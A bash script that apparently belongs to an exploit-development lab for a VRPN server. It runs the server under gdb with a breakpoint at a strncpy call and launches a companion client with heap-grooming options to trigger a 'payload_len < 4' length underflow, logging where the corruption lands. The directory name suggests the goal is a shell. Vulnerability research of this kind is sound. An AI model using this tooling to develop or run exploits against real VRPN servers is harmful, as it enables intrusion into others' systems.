#!/usr/bin/env bash
# W24 gdb landing probe for the payload_len < 4 strncpy underflow.
# Usage: probe-underflow-gdb.sh <outdir> <port> <line> [groom_bytes]
# Env: BIN, MSGTYPE, DECLARED, PRE
set -uo pipefail
OUT=${1:?outdir}
PORT=${2:?port}
LINE=${3:?source line of strncpy}
GROOM=${4:-0}
BIN=${BIN:-lab/frontier/vrpn2shell/build-plain-07.36/server_src/vrpn_server}
MSGTYPE=${MSGTYPE:--1}
DECLARED=${DECLARED:-24}
PRE=${PRE:-1.0}

cd "$(dirname "$0")/../../.." || exit 2
mkdir -p "$OUT"
CMD="$OUT/gdb.cmd"
cat >"$CMD" <<EOF
set pagination off
set confirm off
break vrpn_Connection.C:$LINE
commands
silent
printf "STRNCPY_SITE payload_len=%u buffer=%p name=%p\\n", p.payload_len, p.buffer, &sender_name
x/8bx p.buffer
bt 3
continue
end
run -f lab/frontier/vrpn2shell/vrpn.cfg $PORT
EOF
timeout 30s gdb -q -batch -x "$CMD" --args "$BIN" \
  >"$OUT/gdb.log" 2>&1 &
GPID=$!
sleep 3
python3 lab/frontier/vrpn2shell/wire_underflow.py \
  --port "$PORT" --groom "$GROOM" --declared "$DECLARED" \
  --msgtype "$MSGTYPE" --presleep "$PRE" --hold 3 \
  >"$OUT/client.txt" 2>&1
wait "$GPID" 2>/dev/null || true
echo "=== $OUT"; cat "$OUT/client.txt"
echo '--- gdb key lines'; grep -E 'STRNCPY_SITE|^0x|ERROR:|signal|SIG|STRNCPY|in strncpy|in handle_sender|exited' "$OUT/gdb.log" | head -40
